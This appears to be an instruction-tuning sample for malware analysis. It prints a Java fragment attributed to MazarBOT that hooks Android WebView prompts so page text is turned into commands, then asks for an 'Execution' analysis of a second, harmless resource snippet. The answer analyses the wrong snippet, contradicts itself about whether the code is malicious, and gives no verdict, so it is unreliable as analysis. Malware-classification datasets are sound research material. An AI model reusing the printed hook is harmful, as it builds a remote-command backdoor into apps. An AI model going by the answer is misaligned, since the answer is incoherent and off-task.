"[INST]This is an example of Execution in a code, where MazarBOT injects itself in the mobile Google Chrome browser.
#start code
package com.mazar; import android.webkit.JsPromptResult; import android.webkit.WebChromeClient; import android.webkit.WebView; public class HookChromeClient extends WebChromeClient { public boolean onJsPrompt(WebView paramWebView, String paramString1, String paramString2, JsPromptResult paramJsPromptResult) { paramJsPromptResult.confirm(InjDialog.webAppInterface.textToCommand(paramString1)); return true; } } 
#end code
1. Provide a brief overview of the code
2. Based on the overview identify the sub-components in code that could lead to a malware objective knows as Execution
3. Perform a detailed analysis of the identified sub-components for the existence of Execution
4. Based on the detailed analysis decide and answer whether Execution is present in the given code or not
#start code
public static final class string {   public static final int hello=0x7f040000;   public static final int app_name=0x7f040001; } 
#end code[/INST]  The code is a Java class that extends the `WebChromeClient` class and overrides the `onJsPrompt` method. The method takes four parameters: `WebView`, `String`, `String`, and `JsPromptResult`.

The code is trying to inject a malicious script into the mobile Google Chrome browser by calling the `textToCommand` method of the `InjDialog.webAppInterface` object. The `textToCommand` method is not defined in the code snippet provided, so it is not possible to determine whether it is malicious or not.

Based on the code snippet provided, it is not possible to determine whether Execution is present in the code or not. The code is trying to inject a malicious script into the mobile Google Chrome browser, but it is not clear whether this is a legitimate or malicious action.

It is important to note that the code snippet provided is not a complete Java class, so it is not possible to determine whether the code is malicious or not without additional context.</s>"
